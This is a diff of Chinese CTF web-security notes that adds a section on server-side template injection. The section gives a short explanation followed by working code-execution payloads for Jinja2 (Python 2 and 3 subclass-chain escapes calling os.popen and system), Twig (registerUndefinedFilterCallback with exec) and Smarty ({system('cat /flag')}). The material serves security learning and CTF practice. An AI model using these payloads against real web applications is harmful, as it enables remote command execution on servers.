@@ -1331,7 +1331,7 @@ var_dump(in_array('1bc', $array)); //true
 
 
 
-## XXE（。。。）
+## XXE
 
 #### XXE漏洞简介
 
@@ -1607,19 +1607,74 @@ php://filter/read=convert.base64-encode/resource=xxx.php
 
 [更多……](https://xz.aliyun.com/t/6887#toc-5)
 
-## SSTI--模板注入（。。。）
+## SSTI--模板注入
+
+#### SSTI概念
+
+> SSTI看到ss两个字母就会想到服务器，常见的还有SSRF(服务器端请求伪造)。SSTI就是服务器端模板注入(Server-Side Template Injection)
+>  说到注入，我们常见的注入有sql注入，sql注入我们都很熟悉，但SSTI和sql注入一样都是先从用户获得一个输入将其作为 Web  应用模板内容的一部分，在进行目标编译渲染的过程中，执行了用户插入的恶意内容，因而可能导致了敏感信息泄露、代码执行、GetShell  等问题。其影响范围主要取决于模版引擎的复杂性。
+
+#### 什么是模板引擎
+
+> 模板引擎是为了使用户界面与业务数据（内容）分离而产生的，它可以生成特定格式的文档，用于网站的模板引擎就会生成一个标准的文档，就是将模板文件和数据通过模板引擎生成一个HTML代码。
+
+![在这里插入图片描述](CTF-WEB%E7%AF%87.assets/20200405101824486.png)
+
+模板引擎格式：
+
+![https://upload-images.jianshu.io/upload_images/15314495-66404bcc512933fc](CTF-WEB%E7%AF%87.assets/15314495-66404bcc512933fc)
 
 
 
+#### 一些模板payload
+
+~~~
+模板引擎：Smarty，Mako，Jinja2，Jade，Velocity，Freemaker和Twig
+常见模板注入：
+flask/jinja2模板注入
+PHP/模版引擎Twig注入
+~~~
+
+`遇到考察SSTI的题目，可按照下面的图进行测试,从而判断出是那个模板引擎，再去找对应的payload`
+
+![https://upload-images.jianshu.io/upload_images/15314495-8ce9f220db5385a6](CTF-WEB%E7%AF%87.assets/15314495-8ce9f220db5385a6)
+
+**jinja2**
+
++ **python2_任意执行**
+
+  ~~~
+  #(system 函数换为popen('').read()，需要导入os模块)  
+  {{''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').popen('ls').read()")}} 
+  #(不需要导入os模块，直接从别的模块调用)
+  {{().__class__.__bases__[0].__subclasses__()[71].__init__.__globals__['os'].popen('ls').read()}}
+  #常用的py2 EXP
+  ().__class__.__base__.__subclasses__()[59].__init__.__globals__['__builtins__']['eval']("__import__('os').system('whoami')")
+  
+  ~~~
+
++ **python3_任意执行**
+
+  ~~~
+  {{().__class__.__bases__[0].__subclasses__()[75].__init__.__globals__.__builtins__['eval']("__import__('os').popen('id').read()")}}
+  
+  ~~~
+
+#### Twig
+
+~~~
+使用{# comment #}判断，这是注释。并不会回显。
 
 
+{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
+~~~
 
+**Smarty**
 
-
-
-
-
-
+~~~
+般情况下输入{$smarty.version}就可以看到返回的smarty的版本号
+{system('cat /flag')}
+~~~
 
 
 
